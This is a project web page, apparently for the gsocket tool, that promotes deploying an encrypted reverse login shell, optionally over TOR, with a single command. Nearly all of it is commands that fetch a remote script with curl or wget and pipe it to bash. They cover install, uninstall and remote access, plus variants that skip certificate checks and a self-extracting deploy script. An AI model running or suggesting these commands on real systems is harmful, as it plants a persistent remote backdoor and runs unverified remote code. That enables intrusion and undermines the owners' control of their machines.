---
layout: default
---

<p class="panel-note2" markdown="1">Can no longer connect to your deployed gs-netcat? Use this command >>*S=YourSecret bash -c "$(curl -fsSL gsocket.io/**xold**)"*<< or >>*S=YourSecret bash -c "$(wget -qO- gsocket.io/**xold**)"*<< to access your old session. [Click here to update to 1.4.32 or later]({{site.github.repository_url}}/blob/master/deploy/README-update.md).</p>

Deploy a reverse login shell with a *single command* (fully automated) - and access the shell remotely - encrypted - and via TOR if you like. 

> _This must be the quickest way to access a system_
>                                                 -- anonymous

Use either one of these two commands to _deploy_:
```shell
bash -c "$(curl -fsSL gsocket.io/x)"
```
```shell
bash -c "$(wget --no-verbose -O- gsocket.io/x)"
```

Use either one of these two commands to _uninstall_:
```shell
GS_UNDO=1 bash -c "$(curl -fsSL gsocket.io/x)"
```
```shell
GS_UNDO=1 bash -c "$(wget -qO- gsocket.io/x)"
```

Use either command to _access_ the remote host:
```shell
S="ExampleSecretChangeMe" bash -c "$(curl -fsSL gsocket.io/x)"
```
```shell
S="ExampleSecretChangeMe" bash -c "$(wget -qO- gsocket.io/x)"
```

<p class="panel-note2" markdown="1">This is just one of many GSOCKET examples. More on [GitHub]({{site.github.repository_url}}).</p>

{:refdef: style="text-align: center;"}
## Screenshots
{: refdef}
Deploy on a host
{:refdef: style="text-align: center;"}
![Deploy-Example](../assets/images/deploy-example.png)
{: refdef}
Log in to the host from your workstation
{:refdef: style="text-align: center;"}
![Deploy-Login](../assets/images/deploy-login.png)
{: refdef}

{:refdef: style="text-align: center;"}
## Tips & Tricks
{: refdef}

Ignore SSL / Certificate warnings:
```shell
bash -c "$(curl -fsSLk gsocket.io/x)"
```
```shell
bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
```

Deploy with a predefined secret:
```shell
X=ExampleSecretChangeMe bash -c "$(curl -fsSL gsocket.io/x)"
```

Deploy with *curl* and fallback to *wget*:
```shell
command -v curl >/dev/null && bash -c "$(curl -fsSL gsocket.io/x)" || bash -c "$(wget -qO- gsocket.io/x)"
```

Deploy with a predefined secret. Try *curl* and fallback to *wget*:
```shell
X=ExampleSecretChangeMe && (command -v curl >/dev/null && X=$X bash -c "$(curl -fsSL gsocket.io/x)" || X=$X bash -c "$(wget -qO- gsocket.io/x)")
```
  
Deploy from self-extracting shell-script [deploy-all.sh](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/deploy-all.sh) without fetching any packages:
```
wget https://github.com/hackerschoice/binary/raw/main/gsocket/bin/deploy-all.sh
chmod 755 deploy-all.sh
./deploy-all.sh
# Use "GS_UNDO=1 ./deploy-all.sh" to uninstall
```

<p class="panel-note" markdown="1">Get Involved. We are looking for volunteers to work on the website and a logo and to discuss new ideas. [Join us on telegram](https://t.me/thcorg).</p>



